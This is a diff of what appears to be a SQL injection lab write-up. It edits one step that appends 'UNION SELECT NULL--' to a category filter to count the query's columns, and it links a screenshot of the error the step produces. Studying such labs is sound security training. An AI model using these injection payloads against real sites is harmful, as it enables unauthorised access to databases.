@@ -10,7 +10,7 @@ SELECT * FROM someTable WHERE category = 'Coroporate+Gifts'
 
 We modify the query to
 
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL--
+SELECT * FROM someTable WHERE category = 'Gifts' UNION SELECT NULL--
   
  which shows that internal server error, which determines that the table does not contain only one column
 ![image](https://user-images.githubusercontent.com/65653010/235020460-8b570a67-20dc-491d-a776-79a2f40e5aed.png)
